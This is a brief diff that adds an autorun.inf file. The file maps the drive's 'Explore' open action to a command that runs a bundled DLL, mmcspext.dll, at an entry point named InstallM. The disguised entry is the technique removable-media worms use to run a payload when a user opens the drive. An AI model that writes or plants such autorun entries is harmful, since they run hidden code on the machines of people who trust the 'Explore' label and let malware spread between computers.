@@ -1,0 +1,5 @@
+[autorun]
+open=
+shell\open=Explore
+shell\open\Command=rundll32.exe .\\mmcspext.dll,InstallM
+shell\open\Default=1
